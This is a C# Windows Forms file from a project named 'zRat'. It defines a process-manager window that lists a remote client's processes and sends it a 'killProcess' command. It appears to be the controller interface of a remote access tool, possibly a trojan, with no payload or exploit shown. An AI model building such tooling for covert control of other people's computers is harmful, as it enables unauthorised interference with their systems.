using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace zRat
{
    public partial class ProcessManager : Form
    {

        public string SelectedClientIP = "";
        public string SelectedClientDesktopName = "";


        public ListView processListView;

        public ProcessManager()
        {
            InitializeComponent();
            processListView = ProcessList;
        }

        private void ProcessManager_Load(object sender, EventArgs e)
        {
            
            ProcessList.GridLines = true;

        }

        private void ProcessList_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void KillSelected(object sender, EventArgs e)
        {
            if (processListView.SelectedItems.Count > 0)
            {
                string SelectedProcess = processListView.SelectedItems[0].Text;
                
                CurrentForm.SendMessageToClient(SelectedClientIP, SelectedClientDesktopName, $"killProcess/{SelectedProcess}");
                //CurrentForm.SendMessageToClient(SelectedClientIP, SelectedClientDesktopName, "processList");
            }
        }
    }
}
